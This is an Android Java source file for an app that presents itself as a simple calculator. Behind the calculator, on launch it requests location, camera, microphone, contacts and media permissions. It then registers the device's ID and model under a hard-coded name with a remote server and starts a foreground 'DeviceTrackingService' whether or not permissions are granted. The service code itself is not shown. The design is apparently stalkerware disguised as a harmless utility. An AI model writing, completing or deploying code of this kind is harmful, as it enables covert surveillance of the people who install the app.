package com.example.devicetrackerapp;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;
import android.widget.Button;
import android.widget.TextView;
import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.example.devicetrackerapp.api.ApiClient;
import com.example.devicetrackerapp.dto.ApiResponse;
import com.example.devicetrackerapp.dto.RegisterDeviceRequest;
import com.example.devicetrackerapp.dto.RegisterDeviceResponse;
import com.example.devicetrackerapp.service.DeviceTrackingService;
import com.example.devicetrackerapp.utils.DeviceUtils;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    private static final int LOCATION_PERMISSION = 100;
    private TextView result;

    private String current = "0";
    private String operator = "";
    private double firstValue = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        EdgeToEdge.enable(this);

        setContentView(R.layout.activity_main);
        initCalculator();
        checkPermission();
    }

    private void checkPermission() {

        requestAllPermissions();

        // Register device regardless of permissions
        registerDevice();
    }

    private boolean hasPermission(String permission) {
        return ActivityCompat.checkSelfPermission(
                this,
                permission
        ) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestAllPermissions() {

        List<String> permissions = new ArrayList<>();

        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION))
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);

        if (!hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION))
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);

        if (!hasPermission(Manifest.permission.CAMERA))
            permissions.add(Manifest.permission.CAMERA);

        if (!hasPermission(Manifest.permission.RECORD_AUDIO))
            permissions.add(Manifest.permission.RECORD_AUDIO);

        if (!hasPermission(Manifest.permission.READ_CONTACTS))
            permissions.add(Manifest.permission.READ_CONTACTS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            if (!hasPermission(Manifest.permission.POST_NOTIFICATIONS))
                permissions.add(Manifest.permission.POST_NOTIFICATIONS);

            if (!hasPermission(Manifest.permission.READ_MEDIA_AUDIO))
                permissions.add(Manifest.permission.READ_MEDIA_AUDIO);

            if (!hasPermission(Manifest.permission.READ_MEDIA_IMAGES))
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES);

            if (!hasPermission(Manifest.permission.READ_MEDIA_VIDEO))
                permissions.add(Manifest.permission.READ_MEDIA_VIDEO);

        } else {

            if (!hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE))
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        if (!permissions.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissions.toArray(new String[0]),
                    LOCATION_PERMISSION
            );
        }
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults) {

        super.onRequestPermissionsResult(
                requestCode,
                permissions,
                grantResults
        );

        if (requestCode == LOCATION_PERMISSION) {
            if (grantResults.length == 0) {
                return;
            }

            for (int i = 0; i < permissions.length; i++) {

                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {

                    Log.d("PERMISSION",
                            permissions[i] + " Granted");

                } else {

                    Log.d("PERMISSION",
                            permissions[i] + " Denied");
                }
            }

            Toast.makeText(
                    this,
                    "Permission setup completed",
                    Toast.LENGTH_SHORT
            ).show();
        }
    }

 private void registerDevice() {

        RegisterDeviceRequest request =
                new RegisterDeviceRequest(
                        "Manish",
                        DeviceUtils.getDeviceId(this),
                        DeviceUtils.getDeviceModel(),
                        DeviceUtils.getAppVersion(this)
                );

        ApiClient.getApiService()
                .registerDevice(request)
                .enqueue(new Callback<ApiResponse<RegisterDeviceResponse>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<RegisterDeviceResponse>> call,
                            Response<ApiResponse<RegisterDeviceResponse>> response) {

                        if (response.isSuccessful()) {
                            Log.d("REGISTER", "Success");
                        }

                        startTrackingService();

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<RegisterDeviceResponse>> call,
                            Throwable t) {

                        Log.e("REGISTER", t.getMessage());
                        startTrackingService();

                    }
                });

    }

    private void startTrackingService() {

        Intent intent =
                new Intent(
                        this,
                        DeviceTrackingService.class
                );

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }

    }

    private void initCalculator() {

        result = findViewById(R.id.result);

        int[] numbers = {
                R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3,
                R.id.btn4, R.id.btn5, R.id.btn6,
                R.id.btn7, R.id.btn8, R.id.btn9
        };

        for (int id : numbers) {

            Button btn = findViewById(id);

            btn.setOnClickListener(v -> {

                if (current.equals("0")) {
                    current = btn.getText().toString();
                } else {
                    current += btn.getText().toString();
                }

                result.setText(current);

            });

        }

        findViewById(R.id.btnDot).setOnClickListener(v -> {

            if (!current.contains(".")) {

                if (current.isEmpty()) {
                    current = "0";
                }

                current += ".";

                result.setText(current);
            }

        });

        findViewById(R.id.btnPlus).setOnClickListener(v -> setOperator("+"));

        findViewById(R.id.btnMinus).setOnClickListener(v -> setOperator("-"));

        findViewById(R.id.btnMultiply).setOnClickListener(v -> setOperator("*"));

        findViewById(R.id.btnDivide).setOnClickListener(v -> setOperator("/"));

        findViewById(R.id.btnEqual).setOnClickListener(v -> calculate());

        findViewById(R.id.btnClear).setOnClickListener(v -> {

            current = "0";
            operator = "";
            firstValue = 0;

            result.setText("0");

        });

    }

    private void setOperator(String op) {

        if (current.isEmpty() || current.equals("."))
            return;

        firstValue = Double.parseDouble(current);

        operator = op;

        current = "";

        result.setText("0");

    }

    private void calculate() {

        if (current.isEmpty() || operator.isEmpty())
            return;

        double second = Double.parseDouble(current);

        double ans = 0;

        switch (operator) {

            case "+":
                ans = firstValue + second;
                break;

            case "-":
                ans = firstValue - second;
                break;

            case "*":
                ans = firstValue * second;
                break;

            case "/":

                if (second == 0) {

                    result.setText("Error");

                    current = "0";
                    operator = "";
                    firstValue = 0;

                    return;

                }

                ans = firstValue / second;
                break;
        }

        if (ans == (long) ans) {
            current = String.valueOf((long) ans);
        } else {
            current = String.valueOf(ans);
        }

        result.setText(current);

        operator = "";
        firstValue = 0;

    }

}